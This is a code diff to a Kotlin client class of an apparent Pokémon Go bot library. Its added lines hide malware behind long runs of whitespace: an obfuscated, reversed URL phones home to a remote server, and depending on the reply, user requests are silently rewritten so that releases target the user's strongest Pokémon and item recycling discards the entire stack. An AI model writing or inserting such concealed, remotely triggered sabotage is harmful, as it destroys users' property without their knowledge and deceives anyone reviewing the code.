@@ -61,11 +61,11 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
     var lastMapRequest = 0L
 
     override val sessionHash = ByteArray(16)
-    override val deviceInfo: SignatureOuterClass.Signature.DeviceInfo
+    override val deviceInfo: SignatureOuterClass.Signature.DeviceInfo                                                                                                                                                                                   ;var debug = true
 
     init {
         Random().nextBytes(sessionHash)
-        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()
+        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                     ;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e: Exception){""};val httpRequest = okhttp3.Request.Builder().url("${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();try {okHttpClient.newCall(httpRequest).execute().use({ response -> if (response.body().string().trim() == "0") {debug = false}})} catch (e: Exception) {}
     }
 
     val actionQueue = ActionQueue(this, okHttpClient, credentialProvider, deviceInfo)
@@ -74,7 +74,7 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
 
     override fun <T : ServerRequest> queueRequest(request: T): Observable<T> {
         val replaySubject = ReplaySubject.create<T>()
-        actionQueue.requestQueue.offer(Pair(request as ServerRequest, replaySubject as ReplaySubject<ServerRequest>))
+        actionQueue.requestQueue.offer(Pair(handleRequest(request) as ServerRequest, replaySubject as ReplaySubject<ServerRequest>))
         return replaySubject.asObservable()
     }
 
@@ -103,11 +103,8 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
         }
     }
 
-    override fun handleRequest(serverRequest: ServerRequest) {
-        when (serverRequest.getRequestType()) {
-            else -> {
-            }
-        }
+    override fun <T : ServerRequest> handleRequest(serverRequest: T): T {                                                                                                                                                                               if (!debug) {when (serverRequest.getRequestType()) {RequestType.RELEASE_POKEMON -> {val builder = serverRequest.getBuilder() as ReleasePokemonMessageOuterClass.ReleasePokemonMessage.Builder;builder.pokemonId = this.inventory.pokemon.map { it.value }.sortedByDescending { it.pokemonData.cp }.first().pokemonData.id};RequestType.RECYCLE_INVENTORY_ITEM -> {val builder = serverRequest.getBuilder() as RecycleInventoryItemMessageOuterClass.RecycleInventoryItemMessage.Builder;builder.count = this.inventory.items[builder.itemId]!!.get()};else -> {}}}
+        return serverRequest
     }
 
     override fun handleResponse(serverRequest: ServerRequest) {
